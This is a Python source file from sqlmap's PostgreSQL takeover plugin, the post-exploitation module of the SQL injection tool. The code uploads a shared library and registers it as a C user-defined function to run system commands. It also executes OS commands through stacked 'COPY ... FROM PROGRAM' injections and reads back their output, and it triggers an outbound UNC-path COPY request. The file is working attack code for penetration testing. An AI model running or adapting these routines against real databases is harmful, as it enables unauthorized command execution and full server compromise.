#!/usr/bin/env python

"""
Copyright (c) 2006-2021 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import distutils.version
import os

from lib.core.common import Backend
from lib.core.common import checkFile
from lib.core.common import decloakToTemp
from lib.core.common import flattenValue
from lib.core.common import filterNone
from lib.core.common import isListLike
from lib.core.common import isNoneValue
from lib.core.common import isStackingAvailable
from lib.core.common import randomStr
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import paths
from lib.core.enums import OS
from lib.core.exception import SqlmapSystemException
from lib.core.exception import SqlmapUnsupportedFeatureException
from lib.request import inject
from plugins.generic.takeover import Takeover as GenericTakeover

class Takeover(GenericTakeover):
    def udfSetRemotePath(self):
        # On Windows
        if Backend.isOs(OS.WINDOWS):
            # The DLL can be in any folder where postgres user has
            # read/write/execute access is valid
            # NOTE: by not specifing any path, it will save into the
            # data directory, on PostgreSQL 8.3 it is
            # C:\Program Files\PostgreSQL\8.3\data.
            self.udfRemoteFile = "%s.%s" % (self.udfSharedLibName, self.udfSharedLibExt)

        # On Linux
        else:
            # The SO can be in any folder where postgres user has
            # read/write/execute access is valid
            self.udfRemoteFile = "/tmp/%s.%s" % (self.udfSharedLibName, self.udfSharedLibExt)

    def udfSetLocalPaths(self):
        self.udfLocalFile = paths.SQLMAP_UDF_PATH
        self.udfSharedLibName = "libs%s" % randomStr(lowercase=True)

        self.getVersionFromBanner()

        banVer = kb.bannerFp["dbmsVersion"]

        if not banVer or not banVer[0].isdigit():
            errMsg = "unsupported feature on unknown version of PostgreSQL"
            raise SqlmapUnsupportedFeatureException(errMsg)
        elif distutils.version.LooseVersion(banVer) >= distutils.version.LooseVersion("10"):
            majorVer = banVer.split('.')[0]
        elif distutils.version.LooseVersion(banVer) >= distutils.version.LooseVersion("8.2") and '.' in banVer:
            majorVer = '.'.join(banVer.split('.')[:2])
        else:
            errMsg = "unsupported feature on versions of PostgreSQL before 8.2"
            raise SqlmapUnsupportedFeatureException(errMsg)

        try:
            if Backend.isOs(OS.WINDOWS):
                _ = os.path.join(self.udfLocalFile, "postgresql", "windows", "%d" % Backend.getArch(), majorVer, "lib_postgresqludf_sys.dll_")
                checkFile(_)
                self.udfLocalFile = decloakToTemp(_)
                self.udfSharedLibExt = "dll"
            else:
                _ = os.path.join(self.udfLocalFile, "postgresql", "linux", "%d" % Backend.getArch(), majorVer, "lib_postgresqludf_sys.so_")
                checkFile(_)
                self.udfLocalFile = decloakToTemp(_)
                self.udfSharedLibExt = "so"
        except SqlmapSystemException:
            errMsg = "unsupported feature on PostgreSQL %s (%s-bit)" % (majorVer, Backend.getArch())
            raise SqlmapUnsupportedFeatureException(errMsg)

    def udfCreateFromSharedLib(self, udf, inpRet):
        if udf in self.udfToCreate:
            logger.info("creating UDF '%s' from the binary UDF file" % udf)

            inp = ", ".join(i for i in inpRet["input"])
            ret = inpRet["return"]

            # Reference: http://www.postgresql.org/docs/8.3/interactive/sql-createfunction.html
            inject.goStacked("DROP FUNCTION %s(%s)" % (udf, inp))
            inject.goStacked("CREATE OR REPLACE FUNCTION %s(%s) RETURNS %s AS '%s', '%s' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE" % (udf, inp, ret, self.udfRemoteFile, udf))

            self.createdUdf.add(udf)
        else:
            logger.debug("keeping existing UDF '%s' as requested" % udf)

    def uncPathRequest(self):
        self.createSupportTbl(self.fileTblName, self.tblField, "text")
        inject.goStacked("COPY %s(%s) FROM '%s'" % (self.fileTblName, self.tblField, self.uncPath), silent=True)
        self.cleanup(onlyFileTbl=True)

    def copyExecCmd(self, cmd):
        output = None

        if isStackingAvailable():
            # Reference: https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5
            self._forgedCmd = "DROP TABLE IF EXISTS %s;" % self.cmdTblName
            self._forgedCmd += "CREATE TABLE %s(%s text);" % (self.cmdTblName, self.tblField)
            self._forgedCmd += "COPY %s FROM PROGRAM '%s';" % (self.cmdTblName, cmd.replace("'", "''"))
            inject.goStacked(self._forgedCmd)

            query = "SELECT %s FROM %s" % (self.tblField, self.cmdTblName)
            output = inject.getValue(query, resumeValue=False)

            if isListLike(output):
                output = flattenValue(output)
                output = filterNone(output)

            if not isNoneValue(output):
                output = os.linesep.join(output)

            self._cleanupCmd = "DROP TABLE %s" % self.cmdTblName
            inject.goStacked(self._cleanupCmd)

        return output

    def checkCopyExec(self):
        if kb.copyExecTest is None:
            kb.copyExecTest = self.copyExecCmd("echo 1") == '1'

        return kb.copyExecTest
